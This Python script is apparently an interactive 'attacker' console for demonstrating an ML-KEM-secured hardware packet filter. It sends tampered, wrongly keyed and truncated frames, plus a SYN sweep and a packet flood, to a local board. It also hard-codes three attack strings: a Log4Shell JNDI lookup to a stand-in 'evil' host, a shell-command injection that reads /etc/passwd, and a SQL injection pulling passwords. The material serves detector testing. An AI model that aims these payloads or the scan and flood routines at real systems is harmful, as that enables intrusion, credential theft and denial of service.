#!/usr/bin/env python3
"""
demo_forward/attacker_console.py -- Device C: a hands-on attacker console.

    python demo_forward/attacker_console.py --port COM5

C is a separate device on its own Pmod link (JB). It has its own identity
(src IP/MAC/port), so the board gives it its own session slot, separate from A.
Commands (type them live, one at a time, the way a person would):

  join            honest ML-KEM handshake as C. Board accepts; C now holds a valid key.
  join-bad        handshake with a malformed public key -> rejected (LD0 fast blink)
  say <text>      a normal message from C (authenticated, delivered to B)
  tamper <text>   valid session, but one flipped tag bit          -> LD7 (BAD_TAG)
  wrongkey <text> encrypted with a key C made up, not the session -> LD7 (BAD_TAG)
  inject <n>      known attack payload n=1..3, correctly tagged   -> LD4 (SIGNATURE)
  scan [ports]    SYN sweep across ports; shows as MALFORMED today -> LD3 (see note)
  flood [n]       needs `join`; valid tagged packets at line rate  -> LD5 (FLOOD)
  truncated       promise 400 B, send 100 B (full headers) then stop -> LD2
  nosession <t>   DATA with no handshake: board drops it; today that drop has no LED
  auto            a narrated, human-paced intrusion: join, probe, tamper, inject, scan, flood
  quit
"""
import argparse, os, random, sys, time
ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, os.path.join(ROOT, "test-network"))
sys.path.insert(0, ROOT)
import wire                                           # noqa: E402
from demo.config.demo_config import BAUD_RATE         # noqa: E402

SIGS = [b"GET /?x=${jndi:ldap://evil/a} HTTP/1.1\r\n\r\n",
        b"POST /shell HTTP/1.1\r\n\r\nid; whoami; cat /etc/passwd",
        b"GET /?q=1' UNION SELECT password FROM users-- HTTP/1.1\r\n\r\n"]
C_PORT = 41000


class C:
    def __init__(self, ser):
        self.ser = ser
        self.s = wire.Session(src_ip=wire.ATTACKER_IP, src_port=C_PORT,
                              src_mac=wire.ATTACKER_MAC)
        self.up = False

    def send(self, b):
        self.ser.write(b); self.ser.flush()

    def join(self):
        print("[C] generating my own key pair, sending public key (800 B)")
        self.send(self.s.handshake_init())
        t0 = time.time(); buf = b""
        while len(buf) < 816 and time.time() - t0 < 5:
            buf += self.ser.read(816 - len(buf))
        if len(buf) < 816:
            print("[C] no reply from the board"); return
        try:
            k = self.s.handshake_finish(buf[:816])
        except ValueError as e:
            print(f"[C] reply rejected: {e}"); return
        self.up = True
        print(f"[C] handshake accepted in {time.time()-t0:.3f} s. I hold a valid key "
              f"({k.hex()[:8]}...). LD0 stays solid; telemetry shows 2 sessions.")

    def join_bad(self):
        print("[C] sending a public key that is the wrong length (700 B)")
        self.send(wire.frame(wire.eth_ip_udp(b"\xAA" * 700, wire.PORT_HS_INIT,
                  C_PORT, wire.ATTACKER_IP, src_mac=wire.ATTACKER_MAC)))
        print("[C] expect: LD0 fast blink (HANDSHAKE_KEY_INVALID), no session for C")

    def need(self):
        if not self.up:
            print("[C] no session yet. Run `join` first."); return False
        return True

    def say(self, t):
        if self.need():
            self.send(self.s.data(t.encode())); print("[C] sent (valid). B will see this.")

    def tamper(self, t):
        if self.need():
            self.send(self.s.data(t.encode(), corrupt_tag=True))
            print("[C] flipped a tag bit. Expect LD7 fast blink; B sees nothing.")

    def wrongkey(self, t):
        if not self.up:
            print("[C] run `join` first so I have a session slot to abuse."); return
        real = self.s.key
        self.s.key = os.urandom(32)       # a key C invented
        try:
            self.send(self.s.data(t.encode()))
        finally:
            self.s.key = real; self.s.nonce_ctr = max(0, self.s.nonce_ctr - 1)
        print("[C] encrypted with a key I made up. Expect LD7 (tag cannot verify); B sees nothing.")

    def inject(self, n):
        if self.need():
            self.send(self.s.data(SIGS[(n - 1) % 3]))
            print("[C] correctly tagged, but the payload is a known attack. "
                  "Expect LD4 fast blink; B sees nothing.")

    def nosession(self, t):
        s2 = wire.Session(src_ip=wire.ATTACKER_IP + 7, src_port=C_PORT + 1,
                          src_mac=wire.ATTACKER_MAC)
        s2.key = os.urandom(32)
        self.send(s2.data(t.encode()))
        print("[C] DATA from an identity that never shook hands. Dropped, no LED today.")

    def scan(self, ports=600):
        print("[C] NOTE: a true port scan (many destination ports) is not reachable on this "
              "bitstream: packets to unknown ports are classed RESERVED and the drop engine "
              "reports MALFORMED (LD3) before the scan detector can speak. Sending the sweep "
              "anyway; expect LD3, not LD6.")
        sent, burst, gap = 0, 10, 0.25
        while sent < ports:
            for _ in range(min(burst, ports - sent)):
                sent += 1
                self.ser.write(wire.frame(wire.eth_ip_udp(
                    b"", 1000 + sent, src_port=40000, src_ip=wire.ATTACKER_IP,
                    src_mac=wire.ATTACKER_MAC, protocol=6, tcp_flags=0x02)))
            self.ser.flush()
            time.sleep(gap * random.uniform(0.6, 1.4))
            burst = min(burst * 2, 100); gap = max(gap * 0.6, 0.01)
        print("[C] sweep done.")

    def flood(self, n=700):
        if not self.need():
            print("[C] a flood from a source with no session is reported as BAD_TAG (LD7), "
                  "which outranks FLOOD. Run `join` first so the packets carry valid tags.")
            return
        print(f"[C] flooding one flow with {n} valid, correctly tagged packets")
        for i in range(n):
            self.ser.write(self.s.data(b"x" * 16))
            if i % 20 == 19:
                self.ser.flush()
        self.ser.flush()
        print("[C] flood sent. Expect LD5 slow blink (tags pass, so FLOOD is the winning reason).")

    def truncated(self):
        print("[C] length prefix promises 400 bytes; sending 100 (headers complete) then silence")
        body = wire.eth_ip_udp(b"q" * 64, wire.PORT_DATA, C_PORT, wire.ATTACKER_IP,
                               src_mac=wire.ATTACKER_MAC)
        self.send((400).to_bytes(2, "big") + body[:100])
        time.sleep(0.05)
        print("[C] expect LD2 (FRAME_TIMEOUT) after ~0.5 ms; needs the header to have parsed")

    def auto(self):
        steps = [("Recon: try a bad key first", self.join_bad, 2.0),
                 ("Now do it properly and join", self.join, 1.5),
                 ("Blend in with a normal message", lambda: self.say("hi, checking in"), 2.5),
                 ("Try to alter a message in flight", lambda: self.tamper("send me the report"), 2.5),
                 ("Try a made-up key", lambda: self.wrongkey("let me in"), 2.5),
                 ("Probe the web app", lambda: self.inject(1), 2.5),
                 ("Map the open ports", self.scan, 2.5),
                 ("Finally, knock it over", self.flood, 1.0)]
        for label, fn, pause in steps:
            print(f"\n--- {label} ---")
            fn(); time.sleep(pause + random.uniform(0, 0.8))


def main():
    ap = argparse.ArgumentParser(); ap.add_argument("--port", required=True)
    a = ap.parse_args()
    c = C(wire.open_serial(a.port, BAUD_RATE))
    print(__doc__)
    while True:
        try:
            line = input("C> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not line:
            continue
        cmd, _, arg = line.partition(" ")
        try:
            if cmd == "quit": break
            elif cmd == "join": c.join()
            elif cmd == "join-bad": c.join_bad()
            elif cmd == "say": c.say(arg or "hello")
            elif cmd == "tamper": c.tamper(arg or "tampered")
            elif cmd == "wrongkey": c.wrongkey(arg or "guess")
            elif cmd == "inject": c.inject(int(arg or 1))
            elif cmd == "truncated": c.truncated()
            elif cmd == "nosession": c.nosession(arg or "knock knock")
            elif cmd == "scan": c.scan(int(arg or 600))
            elif cmd == "flood": c.flood(int(arg or 700))
            elif cmd == "auto": c.auto()
            else: print("unknown command")
        except Exception as e:                       # keep the console alive on stage
            print(f"[C] error: {e}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
